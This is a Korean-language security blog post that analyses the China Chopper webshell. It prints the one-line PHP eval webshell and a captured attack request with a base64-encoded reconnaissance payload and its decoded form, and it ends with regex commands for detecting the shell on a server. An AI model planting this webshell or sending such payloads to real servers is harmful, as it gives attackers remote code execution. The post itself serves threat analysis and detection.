---
layout: post
title: '[위협] China_Chopper.gen'
subtitle: 'threat, rce'
categories: threat
tags: web
comments: true
---

> 이 글은 웹 취약점을 분석한 글입니다. 

# China Chopper.gen(Webshell) 

China Chopper는 2012년에 발견된 4kb크기의 매우 작은 웹쉘이다. 중국 공격자들에 의해 가장많이 사용되며, 다양한 이름으로 존재한다.  

해당 파일은 http 파라미터를 통해 공격이 가능하도록 실행 함수 문자열을 받아와서 아래와 같은 한 줄의 코드를 작성합니다. 

```php
<?php @eval($_POST['cmd']);?>
```

@eval은 php에서 문자열을 실행하는 함수이다. 대표적으로 caidao.exe라는 파일로 심어놓은 웹쉘과 통신하는게 대표적이며, 다양한 공격코드 작성을 통해 많은 기능들을 수행할 수 있다.

이 웹쉘을 통해 아래와 같은 다양한 형식의 공격이 가능하다

- WebDAV file upload
- JBoss jmx-console or Apache Tomcat management pages
- Cross-site scripting (XSS)
- SQL injection
- Vulnerabilities in applications/services
- File processing vulnerabilities
- Remote file include (RFI) and local file include (LFI) vulnerabilities
- Lateral propagation from other access

## 실제 공격 구문 분석

```http
POST /plus/90sec.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: hxxp://www.example.com/plus/90sec.php
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)
Content-Length: 233
Host: www.example.com

guige=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9sa
W1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOztlY2hvICRfU0VSVkVSWydET0NVTU
VOVF9ST09UJ107ZWNobygifDwtIik7ZGllKCk7
```

guide 값으로 공격이 가능한 구문을 입력받는다. 해당 구문은 z0 파라미터의 값을 실행해준다.

z0 파라미터를 디코딩하면 다음과 같다.

```php
@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");;echo $_SERVER['DOCUMENT_ROOT'];echo("|<-");die();
```

display_errors를 실행해 서버의 정보를 취득하는 과정으로 보인다.

->$_SERVER['DOCUMENT_ROOT']<- 의 형태로 공격자에게 보였을 것이다.

## 웹 서버에서 탐지하는 방법

정규표현식을 사용해 악성코드를 찾아내는 것이 빠르다. php버전을 예로 들면 다음과 같다.

```bash
linux: egrep -re ' [<][?]php\s\@eval[(]\$_POST\[.+\][)];[?][>]' *.php
windows: findstr /R /S "[<][?]php.\@eval[(]\$_POST.*[)];[?][>]" *.php
```
